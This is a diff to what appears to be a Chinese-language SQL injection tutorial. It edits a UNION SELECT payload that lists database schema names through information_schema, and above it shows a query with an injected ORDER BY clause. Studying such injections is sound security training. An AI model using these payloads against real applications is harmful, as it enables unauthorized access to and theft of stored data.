@@ -41,5 +41,5 @@ $sql="SELECT * FROM users WHERE id='1'order by 1 --+ ' LIMIT 0,1";
 ```
 查询数据库:  
 ```php
-?id=e' union select 1,2, (select group_concat(schema_name) from information_schema.schemata) -- +
+?id=-1' union select 1,2, (select group_concat(schema_name) from information_schema.schemata) -- +
 ```  
